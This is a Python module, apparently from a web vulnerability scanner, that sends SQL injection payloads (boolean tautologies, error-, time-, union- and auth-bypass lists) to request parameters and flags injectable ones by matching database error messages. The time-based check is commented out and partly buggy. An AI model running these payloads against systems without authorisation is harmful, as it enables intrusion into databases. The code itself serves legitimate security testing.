import time
import asyncio
import re
import xml.etree.ElementTree as ET
from pathlib import Path
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
import random

from components.attack.base_attack import BaseAttack
from components.main.logger import logger
from components.parsers.html import HTML
from components.web.request import Request

class SQLInjection(BaseAttack):
    name = 'sqli'

    BOOLEAN_PAYLOAD_PAIRS = [
        ("' OR 1=1-- ",   "' OR 1=2-- "),
        ("' OR 1=1# ",    "' OR 1=2# "),
        ("' OR 1=1/*",    "' OR 1=2/*"),

        ("' OR 'a'='a'-- ", "' OR 'a'='b'-- "),
        ('" OR "1"="1"-- ',  '" OR "1"="2"-- '),

        ("' OR EXISTS(SELECT 1)-- ", "' OR EXISTS(SELECT 0)-- "),
        ("' OR SLEEP(0)=0-- ",       "' OR SLEEP(0)=1-- "),
    ]
    
    UNION_REGEX = re.compile(r"union(?:.|\s)*select", re.IGNORECASE)

    def __init__(self, crawler, crawler_config, wordlist_path):
        super().__init__(crawler, crawler_config, wordlist_path)
        if not self.wordlist_path:
            self.payloads = self._load_payload_files()
            
        self.error_regexes = self._load_error_regexes()
        
        self.semaphore = asyncio.Semaphore(10)
        self.baseline = {}

    def _load_payload_files(self):
        base = Path(__file__).parent.parent / 'payloads' / 'sqli'
        mapping = {
            'error': 'sqli_error.txt',
            'time': 'sqli_time.txt',
            'union': 'sqli_union.txt',
            'auth_bypass': 'sqli_auth_bypass.txt',
        }
        
        out = {}
        for kind, fname in mapping.items():
            path = base / fname
            try:
                with open(path, encoding='utf-8') as f:
                    lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
                out[kind] = lines
                
            except Exception as e:
                logger.error(f"[sqli] cannot load payload file {path}: {e}")
                out[kind] = []
        return out

    def _load_error_regexes(self):

        xml_path = Path(__file__).parent.parent / 'payloads' / 'sqli' / 'database_errors.xml'
        db_regex_map = {}

        if not xml_path.exists():
            logger.error(f"[sqli] error‐regex file not found: {xml_path}")
            return db_regex_map

        try:
            tree = ET.parse(xml_path)
            root = tree.getroot()
            # iterate over each <dbms value="...">
            for dbms in root.findall('.//dbms'):
                db_name = dbms.get('value')
                if not db_name:
                    continue

                regex_list = []
                for err in dbms.findall('error'):
                    pat = err.get('regexp')
                    if not pat:
                        continue
                    try:
                        regex_list.append(re.compile(pat, re.IGNORECASE))
                    except re.error as rex:
                        logger.error(f"[sqli] invalid regex {pat} for {db_name} in {xml_path}: {rex}")

                if regex_list:
                    db_regex_map[db_name] = regex_list

        except Exception as e:
            logger.error(f"[sqli] failed to parse {xml_path}: {e}")

        return db_regex_map


    async def run(self, request, response):
        if not request.get_params and not request.post_params:
            return
        
        self.baseline[request] = response.elapsed

        error_tasks = [
            asyncio.create_task(
                self._test_error(mutated, request, param, payload)
            )
            for payload in self.payloads['error']
            for mutated, param in self.mutate_request(request, payload, mode='append')
        ]
        
        try:
            for task in asyncio.as_completed(error_tasks):
                if await task:
                    for t in error_tasks:
                        t.cancel()
                    return
        finally:
            for t in error_tasks:
                if not t.done():
                    t.cancel()

        # time_tasks = [
        #     asyncio.create_task(
        #         self._test_time(mutated, request, param, payload)
        #     )
        #     for payload in self.payloads['time']
        #     for mutated, param in self.mutate_request(request, payload, mode='replace')
        # ]
        # try:
        #     for task in asyncio.as_completed(time_tasks):
        #         if await task:
        #             for t in time_tasks:
        #                 t.cancel()
        #             return
        # finally:
        #     for t in time_tasks:
        #         if not t.done():
        #             t.cancel()


    def _find_error(self, text):
        
        text_small = text
        for dbms, regexes in self.error_regexes.items():
            for regex in regexes:
                if regex.search(text_small):
                    return f"SQL Injection {dbms}"
        return ''
        
    async def _false_positive(self, request):
        try:
            resp = await self.crawler.send(request, timeout = 3)
            
        except Exception:
            pass
        
        else:
            if self._find_error(resp.text):
                return True
            
        return False

    async def _test_error(self, mutated, request, param, payload):
        
        if param == 'user_token':
            return False
        logger.debug(f"{mutated} Testing {param} (error) with payload {payload!r}")
        
        try:
            async with self.semaphore:
                resp = await self.crawler.send(mutated, timeout = 3, redirect = False)
                text = resp.text
            
        except Exception as e:
            logger.error(f"Error-based request failed {mutated}: {e}")
            return False
        
        else:
            vulnerability = self._find_error(text)

            if vulnerability and not await self._false_positive(request):
                logger.critical(f'SQL Injection Error Based | {mutated.url} with vulnerable parameter {param} using payload {payload}')
                
                logger.log("VULN", f'Target: {mutated.url} {mutated.method}')
                logger.log("VULN", f'Parameter: {param}')
                logger.log("VULN", f'Payload: {payload}')
                logger.log("VULN", f'Possbile CVE: {vulnerability} {self.search_cve(vulnerability)['description']}')
                print()
                
                return True
                
            return False        


    async def _test_time(self, mutated, request, param: str, payload: str) -> bool:
        threshold = 5.0 
        margin = 0.5 
        path = mutated.path
        
        logger.debug(f"{mutated} Testing {param} (error) with payload {payload!r}")

        # 2) Send mutated request under semaphore
        start = time.time()
        try:
            async with self.semaphore:
                await asyncio.wait_for(self.crawler.send(mutated, redirect=False), timeout=threshold + 2)
        except asyncio.TimeoutError:
            return False
        
        elapsed = time.time() - start

        # 3) Compute extra delay beyond baseline
        extra = elapsed - self.baseline[request].total_seconds()

        # 4) Flag if close to the injected sleep
        if extra >= (threshold - margin):
            logger.critical(
                f"Time-based SQLi detected | {mutated.url} param={param} "
                f"(total={elapsed:.2f}s, baseline={self.baseline:.2f}s)"
            )
            logger.log("VULN", f"Parameter: {param}")
            logger.log("VULN", f"Payload: {payload!r}")
            logger.log("VULN", f"Extra delay: {extra:.3f}s")
            print()
            return True

        return False